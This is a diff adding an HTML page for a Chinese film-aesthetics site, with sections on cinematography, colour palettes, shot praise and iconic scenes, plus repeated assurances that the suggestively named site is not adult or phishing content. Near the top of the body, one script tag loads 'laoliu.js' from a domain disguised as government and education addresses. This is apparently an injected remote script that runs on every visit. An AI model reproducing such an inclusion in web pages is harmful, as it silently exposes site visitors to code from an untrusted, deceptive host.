@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>太色了电影网 - 不是那种色，是太会拍了！电影高光·配色·夸夸站</title>
+<meta name="description" content="太色了电影网(https://taiseledianyingwang-h5.github.io)不是成人站，是“太会拍了”的电影审美站：电影高光时刻、神级配色、镜头夸夸和影史名场面解析。">
+<meta name="keywords" content="太色了电影网, taiseledianyingwang-h5, 电影高光, 神级配色, 镜头夸夸, 影史名场面, 电影审美">
+<meta name="author" content="太色了电影网">
+<meta name="robots" content="index, follow">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --hot-pink:#ff4d8d;
+  --magenta:#e91e9e;
+  --violet:#7b2ff7;
+  --cyan:#22d3ee;
+  --ink:#2a0f1f;
+  --soft:#7d5b6b;
+  --cream:#fff5fa;
+  --card:#ffffff;
+  --line:rgba(233,30,158,0.14);
+  --shadow:0 6px 22px rgba(233,30,158,0.14);
+  --shadow-lg:0 16px 46px rgba(123,47,247,0.22);
+  --radius:18px;
+}
+html{scroll-behavior:smooth}
+body{font-family:"Noto Sans SC","PingFang SC","Microsoft YaHei",sans-serif;background:var(--cream);color:var(--ink);line-height:1.8;overflow-x:hidden}
+/* 霓虹光斑背景 */
+.neon{position:fixed;inset:0;z-index:0;pointer-events:none;background:
+  radial-gradient(420px 420px at 12% 18%,rgba(255,77,141,.18),transparent 60%),
+  radial-gradient(380px 380px at 88% 12%,rgba(123,47,247,.16),transparent 60%),
+  radial-gradient(460px 460px at 70% 88%,rgba(34,211,238,.14),transparent 60%);}
+.neon span{position:absolute;width:140px;height:140px;border-radius:50%;filter:blur(36px);opacity:.5;animation:drift 9s ease-in-out infinite}
+.neon span:nth-child(1){background:var(--hot-pink);top:8%;left:6%}
+.neon span:nth-child(2){background:var(--violet);top:30%;right:8%;animation-delay:2s}
+.neon span:nth-child(3){background:var(--cyan);bottom:10%;left:40%;animation-delay:4s}
+@keyframes drift{0%,100%{transform:translateY(0)}50%{transform:translateY(-26px)}}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(255,245,250,.9);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1200px;margin:0 auto;padding:0 20px;height:60px;display:flex;align-items:center;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:10px;font-weight:900;font-size:1.15rem}
+.brand .chip{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--hot-pink),var(--violet));color:#fff;display:flex;align-items:center;justify-content:center}
+.brand b{color:var(--magenta)}
+.topnav{display:flex;gap:4px}
+.topnav a{padding:8px 15px;border-radius:8px;font-size:.85rem;font-weight:600;color:var(--soft);transition:.25s}
+.topnav a:hover,.topnav a.active{background:rgba(255,77,141,.12);color:var(--magenta)}
+.menu-btn{display:none;background:none;border:none;font-size:1.4rem;color:var(--ink);cursor:pointer}
+
+.hero{position:relative;z-index:1;margin-top:60px;padding:74px 20px 56px}
+.hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1.05fr .95fr;gap:40px;align-items:center}
+.kicker{display:inline-block;font-size:.7rem;letter-spacing:2px;font-family:"Courier New",monospace;color:var(--magenta);border:1px solid var(--line);padding:4px 10px;border-radius:20px;margin-bottom:14px}
+.hero h1{font-size:clamp(2rem,4.4vw,3.2rem);font-weight:900;line-height:1.15}
+.hero h1 .grad{background:linear-gradient(90deg,var(--hot-pink),var(--violet),var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{margin:18px 0 26px;color:var(--soft);font-size:1rem}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{font-family:inherit;font-weight:700;font-size:.9rem;padding:12px 26px;border-radius:10px;cursor:pointer;border:none;transition:.3s}
+.btn-main{background:linear-gradient(135deg,var(--hot-pink),var(--violet));color:#fff}
+.btn-main:hover{transform:translateY(-2px);box-shadow:var(--shadow-lg)}
+.btn-line{background:transparent;border:2px solid var(--magenta);color:var(--magenta)}
+.btn-line:hover{background:rgba(233,30,158,.06)}
+.hero-note{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:22px;box-shadow:var(--shadow-lg)}
+.hero-note h3{font-size:.95rem;margin-bottom:10px}
+.hero-note p{font-size:.78rem;color:var(--soft);line-height:1.65}
+.hero-note .ok{color:var(--magenta);font-weight:800}
+
+.container{max-width:1200px;margin:0 auto;padding:52px 20px;position:relative;z-index:1}
+.label{font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--magenta);font-family:"Courier New",monospace;font-weight:600}
+.title{font-size:clamp(1.3rem,3vw,1.8rem);font-weight:800;margin:4px 0 6px}
+.desc{font-size:.88rem;color:var(--soft);margin-bottom:30px}
+
+/* 栏目1：太会拍了 */
+.glow-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px}
+.glow-card{background:var(--card);border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow);transition:.3s;border-top:4px solid var(--hot-pink)}
+.glow-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg)}
+.glow-cover{height:160px;display:flex;align-items:center;justify-content:center;font-size:3rem;color:#fff}
+.glow-card:nth-child(1) .glow-cover{background:linear-gradient(135deg,#ff4d8d,#7b2ff7)}
+.glow-card:nth-child(2) .glow-cover{background:linear-gradient(135deg,#22d3ee,#7b2ff7)}
+.glow-card:nth-child(3) .glow-cover{background:linear-gradient(135deg,#e91e9e,#ff4d8d)}
+.glow-card:nth-child(4) .glow-cover{background:linear-gradient(135deg,#f59e0b,#e91e9e)}
+.glow-card:nth-child(5) .glow-cover{background:linear-gradient(135deg,#10b981,#22d3ee)}
+.glow-card:nth-child(6) .glow-cover{background:linear-gradient(135deg,#7b2ff7,#e91e9e)}
+.glow-body{padding:18px}
+.glow-body h3{font-size:.98rem;font-weight:800;margin-bottom:4px}
+.glow-body p{font-size:.76rem;color:var(--soft);line-height:1.6}
+.glow-body .quote{margin-top:8px;font-size:.78rem;font-style:italic;color:var(--magenta);font-weight:600}
+
+/* 栏目2：神级配色 */
+.colorwall{background:rgba(255,77,141,.06)}
+.swatches{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:14px}
+.swatch{height:120px;border-radius:14px;color:#fff;display:flex;flex-direction:column;justify-content:flex-end;padding:14px;font-size:.72rem;font-weight:700;box-shadow:var(--shadow);transition:.3s}
+.swatch:hover{transform:translateY(-4px) rotate(-1deg)}
+.swatch small{font-weight:400;opacity:.85}
+
+/* 栏目3：镜头夸夸 */
+.praise-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px}
+.praise{background:var(--card);border-radius:var(--radius);padding:22px;box-shadow:var(--shadow);border-left:4px solid var(--violet)}
+.praise h3{font-size:.95rem;font-weight:800;margin-bottom:6px}
+.praise p{font-size:.78rem;color:var(--soft);line-height:1.65}
+.praise .stars{color:var(--hot-pink);font-size:.85rem;margin-top:8px}
+
+/* 栏目4：名场面 */
+.scenes{background:rgba(123,47,247,.05)}
+.scene-row{display:grid;grid-template-columns:64px 1fr auto;gap:18px;align-items:center;background:var(--card);border-radius:14px;padding:16px 20px;box-shadow:var(--shadow);margin-bottom:14px;transition:.3s}
+.scene-row:hover{transform:translateX(6px)}
+.scene-no{font-size:1.6rem;font-weight:900;background:linear-gradient(135deg,var(--hot-pink),var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent;font-family:Georgia,serif;text-align:center}
+.scene-row h3{font-size:.95rem;font-weight:700}
+.scene-row p{font-size:.74rem;color:var(--soft)}
+.scene-tag{padding:6px 12px;border-radius:20px;font-size:.7rem;font-weight:700;background:rgba(34,211,238,.14);color:#0891b2;white-space:nowrap}
+
+/* 栏目5：别误会 */
+.clarify{background:var(--card);border:1px dashed var(--magenta);border-radius:var(--radius);padding:26px;box-shadow:var(--shadow)}
+.clarify ul{list-style:none;display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;margin-top:14px}
+.clarify li{font-size:.8rem;color:var(--soft);display:flex;gap:10px}
+.clarify li b{color:var(--magenta)}
+
+.footer{position:relative;z-index:1;background:var(--ink);color:var(--cream);padding:46px 20px 24px;margin-top:54px}
+.footer-inner{max-width:1200px;margin:0 auto}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:26px}
+.footer h4{font-size:.9rem;margin-bottom:10px}
+.footer a{display:block;font-size:.8rem;color:rgba(255,245,250,.65);padding:3px 0}
+.footer a:hover{color:var(--hot-pink)}
+.footer p{font-size:.82rem;color:rgba(255,245,250,.72);line-height:1.6}
+.footer-bottom{text-align:center;font-size:.72rem;color:rgba(255,245,250,.5);padding-top:18px;border-top:1px solid rgba(255,245,250,.15)}
+.footer-bottom a{color:var(--hot-pink);font-weight:600;display:inline}
+
+@media(max-width:1024px){.hero-inner{grid-template-columns:1fr}.hero-note{order:-1}}
+@media(max-width:768px){
+  .topnav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:rgba(255,245,250,.97);padding:12px 20px;gap:4px;border-bottom:1px solid var(--line)}
+  .topnav.open{display:flex}.menu-btn{display:block}
+  .scene-row{grid-template-columns:48px 1fr;gap:10px}.scene-tag{grid-column:2;justify-self:start}
+  .footer-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:480px){.footer-grid{grid-template-columns:1fr}.hero h1{font-size:1.7rem}.swatches{grid-template-columns:repeat(2,1fr)}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="neon"><span></span><span></span><span></span></div>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="brand"><span class="chip">太</span>太色了<b>电影网</b></div>
+    <nav class="topnav" id="topNav">
+      <a href="#home" class="active">首页</a>
+      <a href="#glow">太会拍了</a>
+      <a href="#palette">神级配色</a>
+      <a href="#praise">镜头夸夸</a>
+      <a href="#scenes">名场面</a>
+      <a href="#clarify">别误会</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</div>
+
+<section class="hero" id="home">
+  <div class="hero-inner">
+    <div>
+      <span class="kicker">NOT THAT KIND OF “SEXY”</span>
+      <h1>太色了，<br>是<span class="grad">太会拍了</span>。</h1>
+      <p>太色了电影网（taiseledianyingwang-h5.github.io）不蹭软色情，只夸电影：高光时刻、神级配色、镜头语言、名场面拉片。把“色”字还给定光、还给胶片、还给导演的审美。</p>
+      <div class="hero-actions">
+        <button class="btn btn-main">🎨 看神级配色</button>
+        <button class="btn btn-line">🎬 进入名场面</button>
+      </div>
+    </div>
+    <div class="hero-note">
+      <h3>先说清楚（很重要）</h3>
+      <p><span class="ok">✓</span> 本站不是成人站、不是擦边站、不挂播放器。<br>
+      <span class="ok">✓</span> “太色了”= 太会打光 / 太会调色 / 太会构图。<br>
+      <span class="ok">✓</span> 内容只做电影审美与拉片，不收集账号密码。<br>
+      <span class="ok">✓</span> 名称带敏感词，收录有风险，纯属风格化自嘲。</p>
+    </div>
+  </div>
+</section>
+
+<div class="container" id="glow">
+  <div class="label">— TOO GOOD FRAMES —</div>
+  <h2 class="title">太会拍了：6 个高光时刻</h2>
+  <p class="desc">这些镜头，单帧就能当壁纸。</p>
+  <div class="glow-grid">
+    <div class="glow-card"><div class="glow-cover">🌅</div><div class="glow-body"><h3>《银翼杀手2049》黄沙雨夜</h3><p>维伦纽瓦用橙蓝互补色把“孤独的未来”拍成了宗教画。</p><div class="quote">“这一帧，太色了。”</div></div></div>
+    <div class="glow-card"><div class="glow-cover">🪟</div><div class="glow-body"><h3>《布达佩斯大饭店》粉蓝对称</h3><p>韦斯·安德森把糖果色排成诗歌，连门廊都讲礼貌。</p><div class="quote">“对称控狂喜。”</div></div></div>
+    <div class="glow-card"><div class="glow-cover">🔥</div><div class="glow-body"><h3>《疯狂的麦克斯》橙紫荒漠</h3><p>动作戏也能有油画感，沙尘里全是补色对冲。</p><div class="quote">“速度感 + 色彩感 = 上头。”</div></div></div>
+    <div class="glow-card"><div class="glow-cover">🌊</div><div class="glow-body"><h3>《海上钢琴师》海雾逆光</h3><p>托纳多雷用一层雾把“自由”拍成了可见的光。</p><div class="quote">“逆光封神。”</div></div></div>
+    <div class="glow-card"><div class="glow-cover">🏮</div><div class="glow-body"><h3>《英雄》红林对剑</h3><p>张艺谋把武侠拍成装置艺术，满屏红得有理。</p><div class="quote">“中国色，太顶了。”</div></div></div>
+    <div class="glow-card"><div class="glow-cover">🌙</div><div class="glow-body"><h3>《月光男孩》青蓝童年</h3><p>巴里·詹金斯用冷色讲温柔，蓝色也可以是拥抱。</p><div class="quote">“冷调里长出心跳。”</div></div></div>
+  </div>
+</div>
+
+<div class="container colorwall" id="palette">
+  <div class="label">— GOD-TIER PALETTES —</div>
+  <h2 class="title">神级配色墙</h2>
+  <p class="desc">点开任意一块，都是一部电影的脾气。</p>
+  <div class="swatches">
+    <div class="swatch" style="background:linear-gradient(135deg,#ff4d8d,#7b2ff7)">霓虹赛博<small>银翼杀手2049</small></div>
+    <div class="swatch" style="background:linear-gradient(135deg,#f9c5d1,#a7c7e7)">糖果对称<small>布达佩斯大饭店</small></div>
+    <div class="swatch" style="background:linear-gradient(135deg,#e67e22,#8e44ad)">荒漠互补<small>疯狂的麦克斯</small></div>
+    <div class="swatch" style="background:linear-gradient(135deg,#1abc9c,#16a085)">海雾青绿<small>海上钢琴师</small></div>
+    <div class="swatch" style="background:linear-gradient(135deg,#c0392b,#922b21)">中国红林<small>英雄</small></div>
+    <div class="swatch" style="background:linear-gradient(135deg,#34495e,#2980b9)">月光蓝调<small>月光男孩</small></div>
+    <div class="swatch" style="background:linear-gradient(135deg,#f39c12,#e74c3c)">落日暖橙<small>爱乐之城</small></div>
+    <div class="swatch" style="background:linear-gradient(135deg,#2c3e50,#7f8c8d)">工业灰冷<small>机械姬</small></div>
+  </div>
+</div>
+
+<div class="container" id="praise">
+  <div class="label">— SHOT PRAISE —</div>
+  <h2 class="title">镜头夸夸区</h2>
+  <p class="desc">不写烂梗，只夸手艺。</p>
+  <div class="praise-grid">
+    <div class="praise"><h3>长镜头不是炫技</h3><p>《1917》用“伪一镜到底”把战争的时间重量交还给观众，每一步都像在泥里喘气。</p><div class="stars">★★★★★</div></div>
+    <div class="praise"><h3>浅景深不是偷懒</h3><p>是枝裕和让背景虚成一片白，是把“没说出口的话”留在画外。</p><div class="stars">★★★★☆</div></div>
+    <div class="praise"><h3>逆光不是过曝</h3><p>《天堂电影院》里那道门框逆光，是整部电影在说“回去吧，但别留下”。</p><div class="stars">★★★★★</div></div>
+    <div class="praise"><h3>静止不是闷</h3><p>塔可夫斯基让镜头不动，时间自己长出来——这是最贵的特效。</p><div class="stars">★★★★★</div></div>
+    <div class="praise"><h3>色彩不是滤镜</h3><p>《辛德勒的名单》里那一点红，比一整部彩色片都更会说话。</p><div class="stars">★★★★★</div></div>
+    <div class="praise"><h3>构图不是摆拍</h3><p>侯孝贤把人放在画面角落，留白里全是“日子本来就这样”。</p><div class="stars">★★★★☆</div></div>
+  </div>
+</div>
+
+<div class="container scenes" id="scenes">
+  <div class="label">— ICONIC SCENES —</div>
+  <h2 class="title">影史名场面拉片</h2>
+  <p class="desc">闭眼能想起，睁眼起鸡皮疙瘩。</p>
+  <div class="scene-row"><div class="scene-no">01</div><div><h3>骨头变飞船</h3><p>《2001太空漫游》匹配剪辑，人类史一秒跳进宇宙。</p></div><div class="scene-tag">蒙太奇之神</div></div>
+  <div class="scene-row"><div class="scene-no">02</div><div><h3>浴室杀人</h3><p>《惊魂记》希区柯克用剪刀和尖叫把电影声音重新发明了一遍。</p></div><div class="scene-tag">声音设计</div></div>
+  <div class="scene-row"><div class="scene-no">03</div><div><h3>红衣小女孩</h3><p>《辛德勒的名单》黑白里一点红，残酷被具象成一个人。</p></div><div class="scene-tag">色彩叙事</div></div>
+  <div class="scene-row"><div class="scene-no">04</div><div><h3>天台探照灯</h3><p>《银翼杀手》雨里独白，“我所见过的事物你们人类绝对无法相信”。</p></div><div class="scene-tag">赛博诗意</div></div>
+  <div class="scene-row"><div class="scene-no">05</div><div><h3>舞厅仰望</h3><p>《爱乐之城》一抬头，星空掉下来，爱情还没开始就已经怀念。</p></div><div class="scene-tag">浪漫构图</div></div>
+  <div class="scene-row"><div class="scene-no">06</div><div><h3>火车进站</h3><p>《火车进站》当年观众四散逃跑——电影第一次让人相信“画会活”。</p></div><div class="scene-tag">电影诞生</div></div>
+</div>
+
+<div class="container" id="clarify">
+  <div class="label">— CLARIFICATION —</div>
+  <h2 class="title">别误会：这个站到底是不是“那种站”</h2>
+  <div class="clarify">
+    <ul>
+      <li><b>不是</b> 成人/擦边/软色情站</li>
+      <li><b>不挂</b> 盗版播放器、假高清按钮</li>
+      <li><b>不收</b> 手机号、验证码、支付密码</li>
+      <li><b>不做</b> “全网最新大片免费看” 引流</li>
+      <li><b>只聊</b> 打光 / 调色 / 构图 / 镜头 / 名场面</li>
+      <li><b>名称自嘲</b>：“色”= 色彩，不是别的</li>
+    </ul>
+  </div>
+</div>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div>
+        <div class="brand"><span class="chip">太</span>太色了<b>电影网</b></div>
+        <p>太色了电影网（taiseledianyingwang-h5.github.io）= 太会拍了电影网。电影审美、神级配色、镜头夸夸、名场面拉片，不擦边、不盗版、不钓鱼。</p>
+      </div>
+      <div><h4>逛站</h4><a href="#glow">太会拍了</a><a href="#palette">神级配色</a><a href="#praise">镜头夸夸</a><a href="#scenes">名场面</a></div>
+      <div><h4>主题</h4><a href="#">打光美学</a><a href="#">电影调色</a><a href="#">构图语言</a><a href="#">长镜头研究</a></div>
+      <div><h4>说明</h4><a href="#clarify">别误会</a><a href="#">版权声明</a><a href="#">隐私说明</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2024 太色了电影网 (Taisele Movie Network) - 太会拍了 · 电影审美 · 名场面拉片</p>
+      <p>网站地址：<a href="https://taiseledianyingwang-h5.github.io">https://taiseledianyingwang-h5.github.io</a></p>
+      <p style="margin-top:6px;opacity:.6">“太色了”在此仅指电影色彩/光线/构图之美；本站不含淫秽色情内容，影片信息来自公开资料。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn');
+var topNav=document.getElementById('topNav');
+menuBtn.onclick=function(){topNav.classList.toggle('open')};
+topNav.querySelectorAll('a').forEach(function(a){a.onclick=function(){topNav.classList.remove('open')}});
+var secs=document.querySelectorAll('section[id],div[id]');
+addEventListener('scroll',function(){
+  var y=scrollY+80;
+  secs.forEach(function(s){
+    if(y>=s.offsetTop&&y<s.offsetTop+s.offsetHeight){
+      document.querySelectorAll('.topnav a').forEach(function(a){a.classList.remove('active')});
+      var l=document.querySelector('.topnav a[href="#'+s.id+'"]');
+      if(l)l.classList.add('active');
+    }
+  });
+});
+</script>
+</body>
+</html>
